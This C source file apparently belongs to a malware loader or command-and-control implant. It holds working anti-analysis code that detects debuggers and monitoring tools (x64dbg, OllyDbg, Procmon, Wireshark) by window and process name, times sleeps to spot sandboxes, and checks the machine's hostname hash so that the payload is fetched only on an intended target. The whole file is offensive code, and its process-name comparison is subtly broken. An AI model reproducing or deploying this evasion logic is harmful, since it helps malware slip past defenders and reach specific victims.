#include "anti.h"

bool wsl_check_procs(PCORE c) {

    // From https://anti-debug.checkpoint.com/ <3

    char enemies[][32] = {

        { 'x', '6', '4', 'd', 'b', 'g', 0x0 },
        { 'x', '6', '4', 'd', 'b', 'g', '.', 'e', 'x', 'e', 0x0 },
        { 'P', 'r', 'o', 'c', 'm', 'o', 'n', '.', 'e', 'x', 'e', 0x0 },
        { 'W', 'i', 'r', 'e', 's', 'h', 'a', 'r', 'k', '.', 'e', 'x', 'e', 0x0 },
        { 'P', 'r', 'o', 'c', 'm', 'o', 'n', '6', '4', '.', 'e', 'x', 'e', 0x0 },
        { 'O', 'l', 'l', 'y', 'D', 'b', 'g', 0x0 },
        { 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 'r', 'm', 'e', 'r', '.', 'e', 'x', 'e', 0x0 }
        
    };

    // For each enemy

    for ( int i = 0; i < ( sizeof(enemies) / sizeof(enemies[0]) ); i++ ) {

        // If a window is open return true we should NOT grab the payload

        if ( c->api.FindWindowA( NULL, enemies[i]) != NULL )
            return true;

    }

    // Check for enemy processes

    PROCESSENTRY32 proc_entry = { 0 };
    HANDLE snapshot = c->api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if ( c->api.Process32First( snapshot, &proc_entry ) ) {

        while ( c->api.Process32Next( snapshot, &proc_entry ) ) {

            for ( int i = 0; i < ( sizeof(enemies) / sizeof(enemies[0]) ); i++ ) {

                if ( proc_entry.szExeFile == enemies[i] )
                    return true;

            }
        }
    }

    return false;
}

bool wsl_check_hostname(PCORE c) {

    // From https://pre.empt.blog/2023/maelstrom-4-writing-a-c2-implant <3

    CHAR host_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD szhost_name = sizeof(host_name);

    c->api.GetComputerNameA(host_name, &szhost_name);

    if ( djb2(host_name) == WSL_TARGET ) {
        return true;
    }

    return false;
}

bool wsl_check_time(PCORE c) {

    // From https://anti-debug.checkpoint.com/ <3

    LARGE_INTEGER start, end;

    c->api.QueryPerformanceCounter(&start);
    c->api.Sleep(WSL_SLEEP_TIME);
    c->api.QueryPerformanceCounter(&end);

    if ( ( end.QuadPart - start.QuadPart ) <= WSL_SLEEP_TIME )
        return true;

    return false;
}

bool wsl_run_checks(PCORE c) {
    
    // Sleep for some time and check if it was sped up

    if ( wsl_check_time(c) )
        return false;

    // Check if process was started by a debugger

    if ( wsl_check_ntg() )
        return false;

    // Check for enemy processes

    if ( wsl_check_procs(c) )
        return false;

    if ( !wsl_check_hostname(c) )
        return false;

    return true;
}